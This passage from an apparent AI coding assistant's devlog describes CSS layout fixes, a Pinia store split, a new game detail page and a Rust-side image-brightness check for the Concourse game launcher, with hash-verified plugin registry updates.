Stats/Settings/UiTest have no sticky element inside them and rely on that padding-top working
normally. Applied identically to both `TagsPanel.vue`/`CollectionsPanel.vue`. `bun run build`
clean.

**Follow-up, on user question: does each panel still need its own root wrapper?** Answer:
yes structurally (`.panel` is each component's actual template root, not an extra nested
wrapper - a Vue SFC needs exactly one), but that prompted checking whether the two
components' *style blocks* still needed to be duplicated now that the sticky-header fix made
them fully byte-identical (`diff` confirmed - the only differences left were a shortened
comment and "tag list" vs. "collection list" in a code comment, no actual rule differences).
Moved the whole shared block (`.panel`/`.sticky-header`/`.add-form`/`.item-list`/`.item-name`/
`.item-count`/`.edit-input`/`.row-controls`/`.icon-button`/`.empty`) into `styles.css`,
following the Milestone 17 convention rather than leaving real duplication in place - removed
both components' now-fully-empty `<style scoped>` blocks entirely. Verified via compiled CSS
that `.panel`/`.sticky-header` each compile exactly once (not once per component), and via
`bun run build` (clean, CSS bundle shrank slightly).

**Follow-up, on user observation: every non-library view except Settings' own two-component
case uses `.settings-panel` identically, so why does `App.vue` own the wrapper div at all?**
Agreed and moved it - `.settings-panel` only ever existed as a scoped rule in `App.vue`,
matching the wrapper div App.vue itself rendered around each view's component(s). Real blocker
found immediately: a scoped rule only matches elements carrying *that* component's own
`data-v-*` attribute, so simply adding `class="settings-panel"` to a *child* component's own
root (e.g. `StatsPanel.vue`) would never actually match `App.vue`'s scoped selector at all -
had to move `.settings-panel`'s definition into `styles.css` as a real global class first,
same requirement the `.panel`/`.sticky-header` move faced moments earlier.
- Removed the wrapping `<div class="settings-panel">` from all five of `App.vue`'s non-library
  branches; each now renders its component(s) directly. Added `settings-panel` as a second
  class on each component's own root: `AppSettings.vue`'s `.app-settings`,
  `PluginSettings.vue`'s `.plugin-settings`, `StatsPanel.vue`'s `.stats-panel`,
  `TagsPanel.vue`/`CollectionsPanel.vue`'s `.panel`, and `UiTest.vue`'s `.ui-test`.
- **Settings view is the one real wrinkle**: `AppSettings`/`PluginSettings` used to share one
  `.settings-panel` wrapper (padding-top applied once, at the very top), relying on
  `AppSettings.vue`'s own `margin-bottom: 1.5rem` for the gap before `PluginSettings`. With
  both now independently carrying `settings-panel`, `PluginSettings` gets its own
  `padding-top` too - removed `AppSettings.vue`'s now-redundant `margin-bottom` rather than
  stacking both gaps, since `PluginSettings`' own new top padding (`var(--space-5)`, close
  enough to the old `1.5rem`) already supplies equivalent separation on its own.
- **`TagsPanel.vue`/`CollectionsPanel.vue`'s sticky-header cancel-trick needed rethinking**,
  since it previously relied on `.panel` (child) and `.settings-panel` (separate parent
  wrapper) being two different elements - a negative `margin-top` on the child pulling it up
  through the parent's padding. With both classes now living on the *same* element, margin and
  padding on one box don't cancel the way two nested boxes would (worked through the box-model
  arithmetic by hand rather than assuming it still worked) - simplified to a direct compound-
  selector override instead: `.panel.settings-panel { padding-top: 0 }`, which unconditionally
  wins over `.settings-panel` alone regardless of source order (specificity, not a cascade-
  order dependency this time). `.sticky-header`'s own `padding-top` is unchanged, still the
  real persisted gap.
- Verified via compiled CSS: `.settings-panel{padding:var(--space-5) var(--space-6) 0}` once,
  `.panel.settings-panel{padding-top:0}` present and correctly overriding just that one
  longhand. `bun run build` clean.

**Follow-up, on user question: `library.ts` had grown a lot of tag/collection actions - worth
its own substore(s)?** Agreed it was: tags/collections now each have their own dedicated
manager tab (`TagsPanel.vue`/`CollectionsPanel.vue`), a real separate domain from core game
CRUD/launch/search, not just "many actions living in one file." Split into
`stores/tags.ts`/`stores/collections.ts`, structurally identical to each other (collections
mirrors tags exactly, same as their DB repositories already do).

- Each new store owns its own `gameTags`/`allTags`/`activeFilter` (or the collection
  equivalents), a `refresh(games: Game[])` that takes the current game list as a parameter
  rather than owning it (a tags store has no business knowing which games exist, only which
  tags each one carries), `toggleFilter`/`matches` for the library filter, `addToGame`/
  `removeFromGame` for per-game assignment, and `create`/`rename`/`remove`/`getUsageCounts`
  for the manager tab.
- **Real efficiency gain, not just a file-organization one**: previously every tag/collection
  mutation called the whole `library.ts` `refresh()` (reload games + tags + collections all
  together), even though renaming a tag can't possibly change which games exist. Each new
  store's own mutations now call a private `refreshSelf()` (re-runs just that store's own
  `refresh()` against the current `useLibraryStore().games`) instead - a tag rename no longer
  re-fetches the games list or collection data for no reason.
- **Circular import, deliberately fine**: `tags.ts`/`collections.ts` import `useLibraryStore`
  (to read `.games` inside `refreshSelf`), and `library.ts` imports both new stores (for
  `filteredGames`/`refresh()`). This is a real circular module reference, but every use is
  inside a function body (`useTagsStore()` called at call-time, never at module-evaluation
  time), which is the standard, documented-safe way Pinia stores compose each other - the
  cycle never actually executes during module load, only later once Pinia itself is already
  installed and something calls into one of these functions.
- Updated all 4 consumers: `EditGame.vue` (per-game assignment - renamed its own local `tags`
  computed to `gameTags` to avoid shadowing the new `useTagsStore()` instance),
  `GameFilters.vue` (the two filter rows), `TagsPanel.vue`/`CollectionsPanel.vue` (the
  manager tabs, now calling the dedicated stores directly instead of via `library`'s
  pass-through actions).
- `library.ts` itself dropped from 378 to 273 lines, keeping only games CRUD/launch/search/
  view-mode - genuinely just game-domain concerns now.
- `bun run build` clean.

**Follow-up, on user request: with six sidebar tabs now, group each one's own top-level
component into a single folder under `src/components/desktop/`.** New
`src/components/desktop/tabs/` - moved `GameFilters.vue`/`GameGrid.vue`/`GameList.vue`
(Library), `StatsPanel.vue`, `TagsPanel.vue`, `CollectionsPanel.vue`, `AppSettings.vue`/
`PluginSettings.vue` (Settings), and `UiTest.vue` (dev). Used `git mv` for each so history
follows the file rather than showing as a delete+add. Deliberately left everything these
render (`GameCard.vue`, `GameListRow.vue`, `SkeletonCard.vue`/`SkeletonRow.vue`, the
`modalForms/` components) in place - those are supporting pieces used *by* a tab's root, not
tab roots themselves.

Grepped every one of the 9 moved files' own imports first rather than moving and fixing
errors reactively - each needed its `../../stores/…`/`../../composables/…`/`../../db`/
`../../plugins/…` imports bumped one level (`../../../…`, since the file is now one directory
deeper), plus component-to-component siblings that *didn't* move: `GameGrid.vue`'s
`./GameCard.vue`/`./SkeletonCard.vue`, `GameList.vue`'s `./GameListRow.vue`/`./SkeletonRow.vue`,
and `PluginSettings.vue`'s `./modalForms/AddPlugin.vue`/`./modalForms/ConfirmInstall.vue` all
became `../` instead of staying `./`, since those targets stayed in `desktop/`'s root while
the importer moved into `desktop/tabs/`. Updated `App.vue`'s own imports for all 9
(`./components/desktop/tabs/...`), including the dynamic `import()` behind `UiTest.vue`'s
`DEV`-gated `defineAsyncComponent` call. Verified with a final grep across `src/` for any
lingering `desktop/<name>` reference missing `/tabs/` - none found. `bun run build` clean.

**Pre-release tidy pass, on request, before tag-pushing.** Audited `milestones.md`/
`devlog.md` end to end rather than assuming the earlier misplacement/renumbering cleanup and
devlog backfill (both done earlier this session) were still fully accurate after the several
rounds of work since - confirmed clean: every Milestone 14 bullet added since then already had
a matching devlog entry, and nothing had drifted back into Milestone 19's section. Compacted
the 4 most-recently-added Milestone 14 bullets (Tags/Collections tabs, the sticky-header/
shared-style fix, the tags/collections store split, the tabs/ folder move) down to one-liners
each, same as the earlier tidy pass did for the older ones - devlog already carries the full
detail, `milestones.md` doesn't need to repeat it.

**Version bump for tag-push.** Milestone 19 (Auto-Update) fully closed since the last version
bump (`1.3.7`, itself a patch bump for in-progress fixes *within* that milestone, set before
it actually closed) - a real Post-1.0 Roadmap milestone closure, warranting the minor bump the
project's own versioning policy ties to it. `1.3.7` -> `1.4.0` across `package.json`/
`src-tauri/Cargo.toml`/`src-tauri/tauri.conf.json`; `cargo check` regenerated `Cargo.lock`'s
matching `concourse` package entry rather than hand-editing it. `bun run build`/`cargo check`
both clean.

**Replaced the "Edit" modal with a full detail page, on the user's own idea.** Scoped it via
two quick decisions up front rather than guessing: the new page replaces `EditGame.vue`'s
modal entirely (not an addition alongside it), and it's a `library`-internal state - not a new
sidebar tab, not an overlay - so navigating into a game's detail temporarily swaps out
`GameFilters.vue`/`GameGrid.vue`/`GameList.vue` within the existing `activeView === 'library'`
branch, with a back button returning to them.

- **`library.ts`**: `editingGame`/`openEdit`/`cancelEdit` renamed `viewingGame`/`openDetail`/
  `closeDetail` (same shape, different name reflecting the new "viewing a page" framing rather
  than "editing in a modal"). `saveEdit` changed behavior, not just name - it used to null out
  `editingGame` after saving (closing the modal); now it re-reads the just-saved game from the
  refreshed `games` list and keeps `viewingGame` pointed at it, since the whole point of "a
  detail page convertible to an editing page" is that saving returns to the page's own view
  mode, not exits the page entirely.
- **New `GameDetail.vue`** (`src/components/desktop/`, a peer of `GameCard.vue`/
  `GameListRow.vue` - not a `tabs/` root, since it's not a sidebar destination): a local
  `editing` ref toggles between a read-only view (cover art, title, platform/release date/
  playtime, description, tag/collection pills, Play/Fetch Metadata/Edit/Remove buttons) and an
  edit form. The edit form is a straight port of the old modal's fields (title/executable
  path/platform/cover+background art URLs with the existing fetch-background button/release
  date/description/skip-dedup checkbox/wrapper profile select/tags/collections sections) -
  same fields, same store actions, just laid out as a page section instead of a modal body.
- `GameCard.vue`/`GameListRow.vue`'s "Edit" button now calls `library.openDetail(game)`
  instead of the old `openEdit`.
- Deleted `EditGame.vue` and its `<EditGame />` mount in `App.vue` entirely, per the "replace,
  don't keep both" scoping decision. Updated three stale doc-comment references to it
  (`CandidatePicker.vue`, two in `styles.css`) that would otherwise have kept pointing at a
  file that no longer exists.
- `bun run build` clean.

**Follow-up, on direct feedback: move every page action to a sticky bottom-right bar.** The
first pass left view mode's Play/Fetch Metadata/Edit/Remove buttons inline at the end of
`.info` and edit mode's Cancel/Save inline at the end of the form - both scrolled away with
the rest of the page on anything taller than the viewport. Restructured the template: added an
outer `.game-detail-page` wrapper around the existing `.game-detail` column, with a new
sibling `.action-bar` holding whichever button set applies (view vs. edit), right-aligned via
`justify-content: flex-end` and pinned via `position: sticky; bottom: 0` - sticky rather than
`fixed` specifically, so it stays anchored to `.content`'s own scroll area (only visible while
`GameDetail.vue` itself is the active view) instead of floating over every other page in the
app the way a viewport-fixed element would.

Moving the edit-mode Save button outside the `<form>` element it used to live in required a
small mechanical fix: a `type="submit"` button only submits the form it's physically nested
inside, and the whole point of moving it into the shared `.action-bar` was to take it out of
that nesting. Simplest fix over the alternative (linking it back via the button's `form="..."`
attribute by id) - dropped `type="submit"` entirely and call `onSave()` directly via `@click`,
since the component already had a plain function to call; the `<form>`'s own
`@submit.prevent="onSave"` stays for Enter-key-in-a-text-input convenience, now just a second
path to the same function rather than the button's only path.

`bun run build` clean.

**Three more follow-ups, on direct feedback: drop `.action-bar`'s border/margin, fix it
floating above the true bottom edge, and give the page itself proper insets.**

- **Border/margin removed** - `.action-bar` no longer has `border-top`/`margin-top`, just its
  own padding for spacing from the content above and from the viewport edges.
- **The floating-above-the-edge bug**: `App.vue`'s `.content` (the scroll container) has its
  own `padding: 0 0 var(--space-5)` bottom padding. That padding sits *inside* `.content`'s
  scrollport, so a `position: sticky; bottom: 0` descendant only ever reaches the padding's
  inner edge, not `.content`'s real bottom - the exact same class of bug `.settings-panel`
  consumers already hit with *top* padding (`TagsPanel.vue`/`CollectionsPanel.vue`'s
  `.panel.settings-panel { padding-top: 0 }` override), just the bottom-edge mirror of it here.
  Fixed the same way: `.game-detail-page` gets `margin-bottom: calc(var(--space-5) * -1)` to
  cancel `.content`'s bottom padding entirely, and `.action-bar`'s own `padding` restores the
  visual gap - now present at every scroll position, including fully scrolled to the bottom,
  instead of leaving a dead gap between the bar and `.content`'s true edge.
- **`GameDetail.vue` had no top/left/right inset at all** - `.content` itself supplies none for
  this view (unlike Stats/Tags/Settings/etc., which get it via `.settings-panel`), and nothing
  in `GameDetail.vue` had filled that gap in, so the page sat flush against the sidebar edge
  and the titlebar. Added `padding: var(--space-5) var(--space-6) 0` directly to `.game-detail`
  (top/sides only - bottom stays 0, `.action-bar` already owns the spacing below the content).

`bun run build` clean.

**Real fix for the still-floating action bar, after the previous negative-margin attempt
turned out not to work (caught by the user, not self-diagnosed).** The earlier fix put
`margin-bottom: calc(var(--space-5) * -1)` on `GameDetail.vue`'s own `.game-detail-page` root,
reasoning by (incorrect) analogy to the `.settings-panel` top-padding fix - but that fix worked
because both the padding and its override lived on the *same* element
(`.panel.settings-panel { padding-top: 0 }`, a compound selector on one class combo). Here,
`.content`'s bottom padding is a property of `.content` itself, a completely different element
owned by `App.vue` - a child's negative margin changes where *it* sits relative to its own
containing block, it can't reach into and cancel a property declared on the ancestor. Verified
this by actually working through the box model rather than assuming the analogy held: a
negative margin-bottom on the last child doesn't remove or overlap the parent's own
padding-bottom, which sits strictly outside the child's margin box regardless.

Real fix, mirroring the *actual* mechanism the `scroll-locked` class already uses on the same
element: added a second conditional class, `:class="{ 'no-bottom-inset': activeView ===
'library' && library.viewingGame }"`, alongside the existing `scroll-locked` binding on
`App.vue`'s own `<main class="content">`. New rule `.content.no-bottom-inset { padding-bottom:
0 }` in `App.vue`'s own scoped style - zeroing the padding on the element that actually owns
it, while `GameDetail.vue`'s `.action-bar` keeps supplying the visual gap back via its own
padding. Removed the dead, ineffective `margin-bottom` from `GameDetail.vue`. Verified via
compiled CSS that `.content.no-bottom-inset{padding-bottom:0}` exists in the built output.
`bun run build` clean.

**Three more requests, delivered together: move Fetch Metadata into the edit side, reshape
edit mode to match view mode's layout (including cover art), and add a fading background-art
backdrop.**

- **Found and fixed a real, independent bug while wiring the first two changes together**:
  `library.ts`'s `viewingGame` was a plain `ref<Game | null>`, set once by `openDetail(game)` to
  a direct object reference. Any subsequent `refresh()` (a metadata fetch, a background-art
  fetch, a plugin scan while the page happened to stay open, ...) reassigns `games.value`
  wholesale from a fresh DB query - brand-new object instances every time - which left
  `viewingGame` pointing at an orphaned, stale copy that never picked up those updates. This
  meant "Fetch Metadata" already silently didn't work correctly even before this pass (it
  updated the DB and the `games` list, but the *displayed* game object on the page never
  changed). Fixed by making `viewingGame` a `computed` derived from `games` by id
  (`viewingGameId` ref underneath) instead of a static object reference - `openDetail`/
  `closeDetail` now just set/clear the id, and `saveEdit` no longer needs its own manual
  re-assignment after `refresh()` either, since the computed picks up the refreshed object on
  its own.
- **Reshaped edit mode to match view mode's two-column layout**: both modes now share the same
  `.view` flex row (cover art on the left, content on the right) instead of edit mode being a
  flat single-column form. The cover preview now uses a new `displayCoverUrl` computed that
  tracks `form.cover_art_url` live while editing (typing a new URL updates the preview
  immediately) and `game.cover_art_url` otherwise - "including cover art" specifically meant
  the preview should reflect in-progress edits, not just be a second copy of the read-only one.
- **Moved "Fetch Metadata" into edit mode's `.action-bar`** (was view mode's) - Cancel/Fetch
  Metadata/Save now sit together while editing; view mode keeps Play/Edit/Remove.
- **Background art backdrop**: new `.backdrop` div, `position: absolute` against
  `.game-detail-page` itself (given its own `position: relative`) rather than `position: fixed`
  against the viewport the way Big Picture's `.bp-backdrop` works - this page scrolls inside
  `.content`, it isn't its own immersive full-screen surface, so anchoring to the viewport
  would have been wrong here. Covers the top 66% of the page height, faded out via
  `mask-image: linear-gradient(to bottom, rgba(0,0,0,1) 0%, rgba(0,0,0,0.05) 100%)` -
  deliberately a mask, not `opacity`, since `opacity` fades a whole element uniformly and the
  ask was specifically a top-to-bottom spatial fade of the image itself. `.game-detail`
  explicitly `z-index: 1` over the backdrop's `z-index: 0` so foreground content and text
  paint above it without needing every individual descendant to opt in.

Not visually verified in a running app - same limitation as every other UI change this
session, no browser/screenshot tooling available in this environment; flagged honestly rather
than claimed as confirmed-good, particularly for text contrast over a bright cover image, which
depends on the actual art and wasn't addressed with an extra scrim since it wasn't asked for.

`bun run build` clean.

**Four follow-up visual fixes, on direct feedback after the backdrop/reshape pass above.**

- **Uniform backdrop area regardless of page height**: the previous `.backdrop` used
  `height: 66%` against `.game-detail-page`, whose own height varies with content (a long
  description or many tags made the page - and therefore the backdrop - taller). New `.hero`
  wrapper (`position: relative; height: 320px; overflow: hidden`) gives the banner a genuine
  fixed size independent of content length; `.backdrop` simplifies to `position: absolute;
  inset: 0` filling that fixed box instead of computing its own height off a moving target.
- **New `useImageBrightness` composable** (`src/composables/`): loads the background art into
  an off-screen `<canvas>`, downscaled to 16x16 (cheap - no need to read full-resolution pixel
  data just to estimate overall brightness), and averages perceived luminance (ITU-R BT.601
  weights: `0.299r + 0.587g + 0.114b`, matching how the eye actually perceives brightness
  rather than a flat RGB average) across every sampled pixel. Below a threshold of 110/255,
  `.game-detail` gets a `dark-backdrop` class flipping text to white via inheritance - nothing
  downstream (`h1`/`.meta`/`.description`) needed its own explicit color before, so cascading
  from one place is enough. Wrapped the canvas read in try/catch specifically for the
  CORS-taint case: an image host without `Access-Control-Allow-Origin` makes `getImageData`
  throw a `SecurityError`, treated as "not dark" (falls back to the existing default text
  color) rather than guessing wrong or surfacing an error for something this cosmetic.
- **Tags/collections moved from next to the description to under the cover art** - both the
  view-mode read-only pill display and the edit-mode add/remove management UI moved into the
  same left column as the cover art (now called `.sticky-side`), leaving the right column
  (`.info`) to just the identity fields (title/meta/description in view mode; the edit form's
  text fields in edit mode).
- **Cover art + Back button made sticky to the top**, matching the page's existing sticky
  bottom action bar: grouped both into `.sticky-side` (`position: sticky; top: 0`) alongside
  the tags/collections that moved there in the same pass, so the whole "identity" cluster
  stays pinned while `.info`'s title/description column scrolls past it. Confirmed this
  doesn't reintroduce the padding-vs-sticky bug from earlier in this milestone: that bug was
  specifically about `.content` (the actual scrolling ancestor) having its own padding: a
  *non-scrolling* intermediate ancestor's padding (here, `.game-detail`/`.view`) doesn't
  constrain how far a sticky descendant can travel, since sticky positioning resolves against
  the nearest scrolling ancestor's scrollport, not every ancestor in between. Gave
  `.sticky-side` and `.info` matching `padding-top: var(--space-5)` on themselves instead of a
  shared ancestor, so both columns start at the same vertical position.

`bun run build` clean. Same visual-verification caveat as the previous pass - no browser
tooling in this environment to confirm the sticky/backdrop/brightness behavior actually looks
right in a running app.

**Fixed a real bug caught immediately by the user testing it: `.hero` was still a normal-flow
element, not a true background layer.** `.hero` was a `flex-shrink: 0` child of
`.game-detail-page`'s own flex column - a completely valid way to reserve a fixed 320px block,
but that's reserving *layout space*, not acting as a backdrop; `.game-detail` (the next flex
child) got pushed down by `.hero`'s full height instead of overlapping it the way a backdrop
image is supposed to sit behind foreground content. Fixed by taking `.hero` out of flow
entirely - `position: absolute; top: 0; left: 0; right: 0` against `.game-detail-page` (which
needed `position: relative` restored as the positioning context for this). `.game-detail`
keeps its own `position: relative; z-index: 1` from the earlier pass, so it now starts at the
page's true top and visually overlaps `.hero` directly, rather than following after it in
normal flow. `.hero` also gained `pointer-events: none` (purely decorative, shouldn't intercept
clicks meant for whatever overlaps it) and an explicit `z-index: 0` to make the stacking
relationship with `.game-detail` unambiguous rather than relying on default paint order.

`bun run build` clean.

**Fixed a real bug, caught by the user testing again: the backdrop still scrolled with the
page.** Taking `.hero` out of flow (previous fix) solved it occupying layout space, but
`.game-detail-page` itself was still a normal-flow, `min-height: 100%` element scrolling
*inside* `.content` - so `.hero` (positioned relative to `.game-detail-page`) moved right along
with it as `.content` scrolled, same as everything else on the page. The user's own suggested
fix was exactly right: make `.info` (the description column) the thing that scrolls, not the
whole page.

- `.game-detail-page`: `min-height: 100%` → `height: 100%` (locked to exactly fill `.content`'s
  own visible height, not allowed to grow taller) plus `overflow: hidden` - `.content` now has
  nothing to scroll for this view at all, since its one child never exceeds its own height.
- `.game-detail`/`.view`: both gained `flex: 1; min-height: 0` so the column layout actually
  distributes the fixed available height down to `.info`, rather than every flex level
  defaulting to "grow to fit content" (a flex item's default `min-height` is `auto` - its own
  content size - which silently defeats `overflow-y: auto` on a descendant unless every level
  in between explicitly opts out via `min-height: 0`).
  `.info` gained `overflow-y: auto` and `min-height: 0` of its own for the same reason - it's
  the one column that actually needs to scroll now.
- **`.sticky-side` and `.action-bar` both dropped their now-pointless `position: sticky`** -
  sticky only does anything relative to a scrolling ancestor, and `.content` no longer scrolls
  for this page at all; both are just normal flex items now (`.sticky-side` naturally static
  since nothing around it scrolls, `.action-bar` pinned to the bottom of `.game-detail-page`'s
  own fixed-height column by ordinary flex layout instead of scroll-tracking).

`bun run build` clean.

**Reverted the previous fix - it overcorrected, on user report: "I cannot scroll when I need
to."** Locking `.game-detail-page` to a fixed height with `overflow: hidden` (previous entry)
did stop the backdrop scrolling away, but it also disabled scrolling the *page as a whole* -
only `.info`'s own internal scroll worked, and neither `.sticky-side` (back button/cover
art/tags) nor a narrow-window `.view` row that wraps awkwardly had any way to reach content
past the visible height. The user's own suggested fix was exactly right: make `.hero` sticky
instead of disabling `.content`'s scroll.

- `.game-detail-page`: back to `min-height: 100%` (a normal-flow page `.content` scrolls as a
  whole again), no `overflow: hidden`.
- `.hero`: `position: absolute` → `position: sticky; top: 0`, plus `margin-bottom: -320px`
  (equal to its own `height`). This is the standard "sticky background overlapped by content"
  technique: a sticky element still participates in normal flow (unlike `absolute`, which is
  why it can genuinely track the scroll position the way `absolute` never could relative to a
  scrolling ancestor), and the matching negative bottom margin reclaims the vertical space it
  would otherwise reserve, so `.game-detail` still starts right at the page's top and visually
  overlaps it - net the same visual result as the earlier `absolute` attempt, but this time the
  page can actually scroll normally past it instead of needing `.content`'s scroll disabled to
  keep it in place.
- `.game-detail`/`.view`/`.info`/`.sticky-side`/`.action-bar` all reverted to their pre-previous-
  entry state (`flex: 1`/`min-height: 0`/`overflow-y: auto` removed from `.game-detail`/`.view`/
  `.info`; `position: sticky` restored on `.sticky-side` and `.action-bar`) - the whole point of
  those additions was supporting the fixed-height/overflow:hidden model that's now reverted, so
  they were dead weight (or actively wrong) once that model was gone.

Verified via compiled CSS: `.hero[data-v-*]{position:sticky;top:0;height:320px;margin-bottom:
-320px;overflow:hidden;z-index:0;pointer-events:none}` matches. `bun run build` clean.

**Fixed a real bug, on user report ("I don't see useImageBrightness working well").** Traced
the whole feature never actually doing anything, in any real usage, to a structural browser
limitation rather than a logic bug in the sampling code itself: reading pixel data out of a
`<canvas>` after drawing a cross-origin image onto it (`getImageData`) is only allowed when
that image was fetched in CORS mode *and* the server responds with a matching
`Access-Control-Allow-Origin` header. Cover/background art CDNs this app actually points at
(SteamGridDB, IGDB, RAWG, TheGamesDB) generally don't send that header for anonymous
requests - the canvas silently "taints," `getImageData` throws a `SecurityError`, and the
original implementation's own `catch` block swallowed it and left `isDark` at its default
`false` every time, with no error surfaced anywhere to point at the real cause. Setting
`img.crossOrigin = "anonymous"` (needed to even attempt the CORS-mode fetch) can also just
fail the image load outright for hosts that don't cooperate, meaning `onload` might never fire
at all - a second, related failure mode with the identical symptom.

Real fix: moved the sampling out of the browser entirely, into a new Rust command,
`check_image_brightness` (`src-tauri/src/image_utils.rs`, new module - none of the existing
ones map to "general-purpose image helper," so didn't force this into an unrelated one).
Downloads the image via `reqwest::get` (a plain server-side HTTP request, never subject to
browser CORS in the first place), decodes it with the new `image` crate dependency
(`Cargo.toml`), downsamples to a 16x16 thumbnail (only a coarse brightness estimate is needed,
not per-pixel precision at full resolution), and averages the same ITU-R BT.601 perceived-
luminance weighting the original browser-side attempt used
(`0.299r + 0.587g + 0.114b`), returning `true` below the same 110/255 threshold.

`useImageBrightness.ts`'s public shape is unchanged (still returns an `isDark` ref reactive to
a `url` ref) - `GameDetail.vue` needed zero changes, only the composable's own internals swapped
from `<canvas>`/`getImageData` to `invoke("check_image_brightness", { url })`. Kept a
`console.error` on failure this time (download/decode errors - bad URL, unsupported format,
network failure) rather than silently swallowing it the way the CORS-taint catch block
effectively did before, so a *future* real failure is at least visible in devtools instead of
looking identical to "working as intended, just never dark."

`cargo check` took ~4.5 minutes (`image`'s own dependency tree, compiled fresh) but finished
clean; `bun run build` clean.

**Fixed a real bug in the brightness-detection *logic* itself, found once the underlying CORS
bug above was actually fixed and real results started coming back.** The trigger only ever
flipped text to a hardcoded `#fff` when the backdrop sampled as dark - correct for light
themes (Catppuccin Latte, Brick Block), whose own default `--color-text` is already dark, but
wrong for dark themes (Catppuccin Macchiato, Midnight Neon): their default text is already
*light*, so it's a *bright* backdrop that clashes there, and the old logic never reversed
anything in that case at all.

- **New `--color-text-reverse` token** (`styles.css`'s `:root`), defaulting to
  `var(--color-base)` - the same reasoning `--color-on-accent` already established: a theme's
  own base color is always the opposite brightness of its text color by construction (light
  theme = light base + dark text; dark theme = dark base + light text), confirmed by checking
  real values (Catppuccin Macchiato: base `#24273a` dark, text `#cad3f5` light; Midnight Neon:
  base `#0d1117` dark, text `#c9d1d9` light) rather than just assuming it held. This means the
  new token needs zero per-theme overrides to already work correctly on every existing theme.
- **Theme-aware trigger direction**: added `isLightTheme()` in `GameDetail.vue`, parsing
  `--color-text`'s own computed hex value (`getComputedStyle(document.documentElement)`) and
  reusing the identical ITU-R BT.601 luminance weighting the backdrop brightness check already
  uses, rather than inventing a new per-theme "is this dark mode" token that every theme file
  would need to remember to set. Read once at setup, not reactively - nothing in this app's
  navigation lets the active theme change while a `GameDetail` page is already mounted
  (switching themes requires leaving this view for Settings first, which unmounts it).
- New `reverseText` computed: `themeIsLight ? backdropIsDark : !backdropIsDark` - reverse on a
  dark image under a light theme, or a bright image under a dark theme. Renamed the class from
  `dark-backdrop` to `reverse-text` (it no longer means "the backdrop is dark," just "text
  should flip") and the CSS rule from a hardcoded `color: #fff` to `color:
  var(--color-text-reverse)`.

`bun run build` clean.

- **Bug: no-backdrop games got reversed text on dark themes.** `backdropIsDark` defaults `false`
  when there's no `background_art_url` (nothing to sample). Under a dark theme, `reverseText`'s
  `!backdropIsDark` branch inverted that unset `false` to `true`, flipping text color to
  `--color-text-reverse` (= `--color-base`) even with no image behind it at all - making text
  color identical to the actual page background (`--color-base`), rendering it invisible. Fixed
  by an explicit early guard in `reverseText`: `if (!backgroundArtUrl.value) return false;` -
  no backdrop now always means no reversal, regardless of theme. `bun run build` clean.

- **Bug: `--color-text-reverse` defaulting to `--color-base` broke on long descriptions.**
  The backdrop's mask gradient fades to ~5% opacity by 2/3 down the page, so a long enough
  description scrolls its later lines past the art entirely, onto the flat page background -
  which literally *is* `--color-base`. Reversed text set to that same value goes invisible
  there, same failure mode as the earlier no-backdrop bug but now legitimately triggered with
  real art present. Root cause: deriving `--color-text-reverse` from any other token
  guarantees it'll eventually collide with that token's own normal use as a background.
  Fixed by giving every theme its own **dedicated, hardcoded** value instead of a `var()`
  default - `#ffffff` for light-classified themes (Latte, Sakura, Brick Block, and the
  compiled-in default), `#000000` for dark-classified themes (Frappé, Macchiato, Mocha,
  Midnight Neon). Updated `src/styles.css` plus all four built-in `src/plugins/catppuccin-*`
  entries, then the three `data-theme-plugins` manifests (Brick Block, Midnight Neon, Sakura -
  each version-bumped, committed, pushed), then re-pinned all three theme entries in
  `concourse-plugin-registry`'s `registry.json` to the new commit SHA via a manual
  `bump-entry.sh`-equivalent (the sandbox has no `jq`, so replicated its exact logic - fetch
  the raw manifest at the new commit, `sha256sum` it, rewrite `manifestUrl`/`wasmSha256` in
  place) - independently re-verified all three hashes via a fresh `curl` before committing,
  same discipline as every other hash-pinned registry change this project has made. Landed via
  PR #14 (main is protected), `validate` CI passed, squash-merged.
  `bun run build` clean.

**Reworked backdrop text-reversal from a static whole-page decision into a live,
scroll-following one, on user report ("the current status of the image brightness check seems
unsatisfactory").** The previous `reverseText` computed made one boolean decision for the
entire page and applied it via a blanket `color` on `.game-detail` - correct for whichever
region it was tuned against, but wrong everywhere else on the page that isn't actually behind
the backdrop image at a given scroll position, since `.hero` only ever visually covers the top
slice of the scrollport (it's `position: sticky`, glued to the viewport's top edge, not the
document's).

- **The fix**: `background-clip: text` + `background-attachment: fixed` on a 2-stop gradient
  (`--color-text-reverse` for the first *N* viewport pixels, `--color-text` after), applied
  per text-bearing element (`h1`, `.meta`, `.description`, edit-form `<label>`s/`<small>`s,
  the title `<input>`) rather than the `.info` wrapper, since `background-clip: text` clips to
  an element's own text glyphs and `.info` has no direct text of its own.
  `background-attachment: fixed` anchors the gradient to the *viewport* (the same anchoring
  `.hero`'s own `position: sticky` achieves) instead of the element it's painted on, so each
  line of text picks up the reversed color only while it's actually passing behind the
  backdrop, then reverts once scrolled past - a live per-scroll-position decision instead of
  one static choice. `background-position: 0 36px` accounts for `TitleBar.vue`'s own height,
  since `.content`'s scrollport (and so `.hero`'s band) starts there, not at the window's true
  top edge.
- Both distances involved went from a fixed 320px to viewport-ratio-based, per a specific
  follow-up request: `.hero`'s own height is `calc(100vh * 2 / 3)` (with `margin-bottom` at the
  same negative value, to keep reclaiming its reserved flow space), and the reversal band is
  `50vh` - deliberately shorter than the hero's own 2/3, since the backdrop's mask-image already
  fades to ~5% opacity by its own bottom edge, so text right at that edge is already sitting on
  a near-flat background. Both being vh-based keeps the 2:1.5 ratio intact at any window size.
- `color: transparent` (required for the `background-clip: text` trick) inherits down to
  descendants by default - reset back to `--color-text` for actual form controls/helper text
  inside `<label>`s (inputs/textareas/selects/checkbox-row text) so only the label's own
  caption picks up the reversal, not live field values. Also broke `caret-color` (inherits from
  `color`), making the title input's text cursor invisible while editing - fixed with an
  explicit `caret-color: var(--color-text)` (or `--color-text-reverse` under `.reverse-band`),
  independent of whatever `color` resolves to.
- **Not scroll-following**: the sticky-side Back button. `.sticky-side` is itself
  `position: sticky`, pinned near the top of the scrollport for virtually the entire scroll
  range (unlike `.info`'s text, which scrolls freely underneath the backdrop) - a flat
  `wantsReverse`-driven color swap is enough there, no gradient/scroll-tracking needed.
- **`useImageBrightness` gained a module-level cache** (`Map<url, Promise<boolean>>`, keyed by
  URL, not per-component) - `check_image_brightness` re-downloads and fully re-decodes the
  image on every call otherwise, so revisiting a game paid that full network+decode round-trip
  again every time. Caches the in-flight `Promise` (not just the resolved value) so rapid
  re-navigation to a game whose check hasn't resolved yet reuses the same request; failed
  lookups are evicted immediately rather than cached, so a transient network error doesn't
